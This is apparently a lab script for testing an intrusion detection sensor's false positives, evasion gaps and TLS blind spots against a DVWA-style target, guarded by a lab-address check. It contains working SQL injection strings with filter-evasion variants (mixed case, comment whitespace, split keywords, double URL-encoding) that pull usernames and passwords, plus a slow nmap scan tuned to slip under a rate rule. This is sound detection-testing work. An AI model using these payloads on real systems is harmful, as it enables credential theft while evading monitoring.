#!/usr/bin/env bash
# FALSE-POSITIVE, FALSE-NEGATIVE (evasion) and BLIND-SPOT tests. Same usage/guard as 03.
#   TLS blind-spot test needs a TLS wrapper on the TARGET:  sudo ./04_fp_fn_blindspot_tests.sh --start-tls-proxy [80]
source "$(dirname "$0")/common.sh"
if [[ "${1:-}" == "--start-tls-proxy" ]]; then   # run on the Kali sensor/target
  command -v socat >/dev/null || die "apt install socat"
  D="$RUN_DIR/tls"; mkdir -p "$D"; openssl req -x509 -newkey rsa:2048 -nodes -keyout "$D/k.pem" -out "$D/c.pem" -days 7 -subj "/CN=lab.local" 2>/dev/null
  cat "$D/k.pem" "$D/c.pem" > "$D/both.pem"; info "TLS 8443 -> 127.0.0.1:${2:-80}  (Ctrl+C to stop)"
  exec socat OPENSSL-LISTEN:8443,cert="$D/both.pem",verify=0,reuseaddr,fork TCP:127.0.0.1:"${2:-80}"
fi
TARGET="${1:?usage: $0 <target_ip> [http_port]}"; PORT="${2:-80}"
is_lab_ip "$TARGET" || die "Not a lab address"; read -r -p "Type LAB to confirm authorised lab target: " C; [[ "$C" == "LAB" ]] || die Aborted
TL="$EVIDENCE_DIR/attack-timeline.csv"; [[ -f "$TL" ]] || echo "scenario,type,start_epoch,end_epoch,expected_sids,description" > "$TL"
mark() { local sc="$1" ty="$2" ex="$3" ds="$4"; shift 5; local s e; info "[$sc] $ds"; s=$(date +%s); "$@" >/dev/null 2>&1 || true; e=$(date +%s); echo "$sc,$ty,$s,$e,\"$ex\",\"$ds\"" >> "$TL"; sleep 8; }
UA='Mozilla/5.0 (X11; Linux x86_64)'
sqli() { curl -s -m 5 -A "$UA" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=$1&Submit=Submit"; }
ssh_burst() { for _ in $(seq 1 8); do timeout 3 ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "admin@$TARGET" true; sleep 0.5; done; }
# expected_sids semantics: "" = NO alert expected ; for FP rows alerts that DO fire are the false positives
mark FP1 FP "" "Benign admin: 8 legit SSH sessions in ~4s (automation/Ansible-like)"  -- ssh_burst
mark FP2 FP "" "Benign search 'credit union select plan' (keyword collision)"            -- curl -s -m 5 -A "$UA" "http://$TARGET:$PORT/?q=credit+union+select+plan"
mark FP3 FP "" "Uptime monitor: ping every 0.2s x8"                                      -- ping -c 8 -i 0.2 "$TARGET"
mark FN1 FN "1000001" "Low-and-slow scan: ports 1-100, 1 probe/sec (evades 15/5s)"       -- nmap -sS -p 1-100 --scan-delay 1s -n --max-retries 0 "$TARGET"
mark FN2 FN "1000006" "Obfuscation: mixed case UnIoN SeLeCt"                             -- sqli "1%27+uNiOn+SeLeCt+user%2Cpassword+FrOm+users--+-"
mark FN3 FN "1000006" "Obfuscation: comment whitespace UNION/**/SELECT"                  -- sqli "1%27+UNION%2F**%2FSELECT+user%2Cpassword+FROM+users--+-"
mark FN4 FN "1000006" "Obfuscation: keyword split UN/**/ION SEL/**/ECT"                  -- sqli "1%27+UN%2F**%2FION+SEL%2F**%2FECT+user%2Cpassword+FROM+users--+-"
mark FN5 FN "1000006" "Obfuscation: double URL-encoding %2555NION %2553ELECT"            -- sqli "1%27+%2555NION+%2553ELECT+user%2Cpassword+FROM+users--+-"
mark BS1 BLINDSPOT "1000008" "Same SQLi over TLS (8443). Expect: only telemetry 1000008, NOT 1000006" -- curl -sk -m 5 -A "$UA" "https://$TARGET:8443/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit"
ok "Done. Timeline: $TL"
